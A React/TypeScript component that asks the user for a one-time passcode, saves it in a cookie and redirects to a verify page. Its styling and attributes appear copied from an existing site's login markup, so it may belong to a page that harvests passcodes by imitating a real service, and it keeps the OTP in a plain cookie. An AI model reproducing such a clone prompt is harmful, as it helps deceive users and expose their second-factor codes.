import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

type OTP = {
  code: string;
}

export default function Passcode() {

  const [formInput, setFormInput] = useState<OTP>({
    code:""
})

const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    cookies.set("otp", formInput)
    navigate("../verify", {replace:true})
}

  return (
    <div>
      <div style={{ display: "block" }}>
        <div
          className="s-alerts -warning spacing-half -icon"
          data-valid="false"
          role="alert"
        >
          <span className="s-alerts__content" style={{ textAlign: "center" }}>
            <p className="b-3">Notification</p>
            <p className="fs-1">
              For your security, enter the one time passcode sent to you
            </p>
          </span>
        </div>
      </div>

      <form onSubmit={handleSubmit} method="POST" className="form" name="login-form">
        <div className="m-t">
          <label className="form-label form__label" htmlFor="user-id">
            Enter code
          </label>
          <div className="dynamic-state">
            <div className="input-group">
              <input
                username-input=""
                className="form-input input-group__input full dynamic-state__input"
                name="code"
                id="user-id"
                type="text"
                required
                onChange={handleInputChange}
              />
            </div>
            <div id="user-id-error"></div>
          </div>
        </div>

        <div className="m-t">
          <button
            login-button=""
            type="submit"
            className="button -default -primary form__btn -full"
          >
            Submit
            <span className="loading--1">.</span>
            <span className="loading--2">.</span>
            <span className="loading--3">.</span>
          </button>
        </div>
      </form>
    </div>
  );
}
